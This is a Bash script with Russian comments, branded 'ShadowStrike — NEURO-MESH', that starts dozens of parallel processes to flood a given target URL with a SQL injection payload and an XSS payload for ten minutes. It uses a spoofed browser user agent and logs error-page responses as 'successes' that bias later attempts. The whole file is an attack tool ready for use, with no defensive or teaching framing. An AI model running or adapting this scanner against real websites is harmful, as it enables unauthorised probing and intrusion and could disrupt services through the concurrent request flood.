#!/bin/bash
# NEURO-MESH — Агенты образуют нейронную сеть
# Если один нашёл уязвимость — мгновенно знают все

TARGET=$1
AGENTS=${2:-40}
DURATION=${3:-600}

[ -z "$TARGET" ] && echo "Usage: $0 http://target.com" && exit 1

MESH="$HOME/.shadow_neuro_mesh"
mkdir -p "$MESH/synapses"

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike — NEURO-MESH                 ║"
echo "║   Нейро-сеть агентов                        ║"
echo "╚══════════════════════════════════════════════╝"

# Общая нейро-сеть (синапсы)
SYNAPSES="$MESH/synapses/network.txt"

# Нейрон — учится и передаёт знания
neuron() {
    local id=$1
    local target=$2
    local end_time=$3
    
    # Веса нейрона (что он знает)
    local WEIGHT_SQLI=1.0
    local WEIGHT_XSS=0.5
    local WEIGHT_LFI=0.3
    
    echo "[N-$id] 🧠 Нейрон активирован"
    
    while [ $(date +%s) -lt $end_time ]; do
        # Читаем синапсы (общие знания)
        if [ -f "$SYNAPSES" ]; then
            # Усиливаем веса от успехов других
            SUCCESS_COUNT=$(grep -c "SUCCESS" "$SYNAPSES" 2>/dev/null || echo 0)
            WEIGHT_SQLI=$(echo "1.0 + $SUCCESS_COUNT * 0.1" | bc 2>/dev/null || echo 1.0)
        fi
        
        # Выбираем атаку по весам
        if [ "$(echo "$WEIGHT_SQLI > $WEIGHT_XSS" | bc 2>/dev/null || echo 0)" -eq 1 ]; then
            PAYLOAD="' OR '1'='1"
            TYPE="SQLi"
        else
            PAYLOAD="<script>alert(1)</script>"
            TYPE="XSS"
        fi
        
        RESP=$(curl -sk --max-time 5 -A "Mozilla/5.0" "$target?q=$PAYLOAD" -o /tmp/neuro_test.html -w "%{http_code}" 2>/dev/null)
        
        if grep -qi "error\|syntax" /tmp/neuro_test.html 2>/dev/null; then
            echo "$TYPE|SUCCESS|$PAYLOAD|$(date +%s)" >> "$SYNAPSES"
            echo "  [N-$id] 🔥 $TYPE УСПЕХ! Сеть усилена"
        fi
        
        sleep 1
    done
}

# Запускаем нейро-сеть
echo "[MESH] Запускаю $AGENTS нейронов..."
END_TIME=$(($(date +%s) + DURATION))

for i in $(seq 1 $AGENTS); do
    neuron "$i" "$TARGET" "$END_TIME" &
done

while [ $(date +%s) -lt $END_TIME ]; do
    SYNAPSE_COUNT=$(wc -l < "$SYNAPSES" 2>/dev/null || echo 0)
    echo "  🧠 Синапсов: $SYNAPSE_COUNT"
    sleep 30
done

wait
echo "[MESH] 🧠 Нейро-сеть завершила обучение"
